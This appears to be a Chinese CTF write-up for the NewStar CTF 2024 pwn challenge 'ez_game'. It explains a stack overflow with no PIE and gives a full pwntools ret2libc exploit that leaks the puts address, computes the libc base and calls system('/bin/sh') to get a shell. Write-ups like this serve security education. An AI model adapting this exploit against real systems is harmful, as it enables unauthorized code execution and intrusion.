---
titleTemplate: ':title | WriteUp - NewStar CTF 2024'
---

# ez_game

![func 函数](/assets/images/wp/2024/week2/ez-game_1.png)

明显的栈溢出且没有后门函数

再 checksec 一下，没有开启 pie

![checksec 的结果](/assets/images/wp/2024/week2/ez-game_2.png)

直接打 ret2libc<span data-desc>（但是得进行栈对齐）</span>

1.先通过 puts 泄露出 puts 地址，通过 puts 地址与 libc 基地址的偏移得到 libc 基地址，并返回 `main` 函数进行第二次溢出，实现 getshell

2.构建 `system("/bin/sh")` 取 shell

:::tip 提示
可以用 ret 地址进行栈对齐
:::

EXP:

```python
from pwn import *

context(os='linux', arch='amd64', log_level='debug')

ifremote = 0
if ifremote == 1:
    io = remote('0.0.0.0', 9999)
else:
    io = process('./attachment')

elf = ELF('./attachment')
# libc=ELF("./libc-2.31.so")
libc = elf.libc

# gdb.attach(io)
# pause()

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr = elf.symbols['main']
ret_addr = 0x0000000000400509

payload = b'a'*0x58+p64(0x0000000000400783)+p64(puts_got)+p64(puts_plt)+p64(main_addr)
io.recvuntil(b'Welcome to NewStarCTF!!!!\n')
io.sendline(payload)
io.recvuntil(b'\x0a')
puts_addr = u64(io.recv(6).ljust(8, b'\x00'))
print("puts_addr======================>", hex(puts_addr))

libc_base = puts_addr-libc.sym['puts']
system_addr = libc_base+libc.sym['system']
bin_sh_addr = libc_base+0x1b45bd

payload = b'a'*0x58+p64(0x0000000000400783)+p64(bin_sh_addr)+p64(ret_addr)+p64(system_addr)
io.recvuntil(b'Welcome to NewStarCTF!!!!\n')
io.send(payload)

io.interactive()
```
